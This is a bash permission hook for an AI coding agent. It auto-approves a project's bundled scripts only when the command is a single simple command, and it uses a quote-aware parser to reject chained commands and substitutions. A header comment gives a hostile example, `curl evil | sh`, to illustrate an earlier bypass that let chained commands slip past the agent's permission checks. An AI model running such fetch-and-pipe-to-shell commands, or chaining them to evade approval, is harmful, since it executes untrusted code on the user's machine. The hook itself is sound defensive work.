#!/usr/bin/env bash
# hook-matcher: Bash
#
# PreToolUse hook: auto-allow scripts bundled with this project's skills.
#
# Self-locating: resolves its own symlink chain to find the project's
# scripts/ directory, then checks if incoming Bash commands resolve to
# the same directory. Works regardless of where the project is cloned.
#
# A permission decision covers the WHOLE command string, not just its
# first word, so approving on the first token alone approved anything
# chained after it: `scripts/status; curl evil | sh` ran unprompted, in
# every project, because these hooks install globally. The command is
# therefore approved only when it is a single simple command — no
# operators, redirections, or substitutions outside single quotes.
#
# Staying silent falls through to normal permissioning, so a false
# rejection costs a prompt while a false approval costs everything.
# Reject when unsure.

set -uo pipefail

# Resolve this hook's real location (macOS readlink has no -f).
self="$0"
while [[ -L "$self" ]]; do
    link="$(readlink "$self")"
    if [[ "$link" == /* ]]; then
        self="$link"
    else
        self="$(dirname "$self")/$link"
    fi
done
SCRIPTS_DIR="$(cd "$(dirname "$self")" && pwd -P)"

# is_simple_command - True when a command line runs exactly one command.
#
# Walks the string tracking quote state, because whether a character is a
# shell operator depends on it: `;` chains commands, but "a;b" is one
# argument. Single quotes suppress everything; double quotes still allow
# $( ) and backticks, so those stay fatal inside them.
is_simple_command() {
    local cmd="$1"
    local i ch next
    local in_single=false in_double=false

    for (( i = 0; i < ${#cmd}; i++ )); do
        ch="${cmd:i:1}"
        next="${cmd:i+1:1}"

        if [[ "$in_single" == true ]]; then
            [[ "$ch" == "'" ]] && in_single=false
            continue
        fi

        # A backslash escapes the next character in both remaining states.
        if [[ "$ch" == "\\" ]]; then
            i=$((i + 1))
            continue
        fi

        if [[ "$in_double" == true ]]; then
            case "$ch" in
                '"') in_double=false ;;
                '`') return 1 ;;
                '$') [[ "$next" == "(" ]] && return 1 ;;
            esac
            continue
        fi

        case "$ch" in
            "'")  in_single=true ;;
            '"')  in_double=true ;;
            '`')  return 1 ;;
            '$')  [[ "$next" == "(" ]] && return 1 ;;
            ';'|'&'|'|'|'<'|'>'|'('|')'|$'\n') return 1 ;;
        esac
    done

    # An unterminated quote means we cannot know where the command ends.
    [[ "$in_single" == false && "$in_double" == false ]]
}

# Read hook input
INPUT="$(cat)"

# Extract the command
COMMAND=$(printf '%s' "$INPUT" | jq -r '.tool_input.command // empty' 2>/dev/null)
[[ -n "$COMMAND" ]] || exit 0

is_simple_command "$COMMAND" || exit 0

# Extract the script path (first whitespace-delimited token)
script_path="${COMMAND%% *}"

# Resolve the script path's directory through symlinks
script_dir="$(cd "$(dirname "$script_path")" 2>/dev/null && pwd -P)" || exit 0

# Must be one of our scripts, not merely a sibling path that resolves here
[[ "$script_dir" == "$SCRIPTS_DIR" ]] || exit 0
[[ -f "$script_dir/$(basename "$script_path")" ]] || exit 0
[[ -x "$script_dir/$(basename "$script_path")" ]] || exit 0

printf '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow","permissionDecisionReason":"Auto-approved skill script"}}\n'
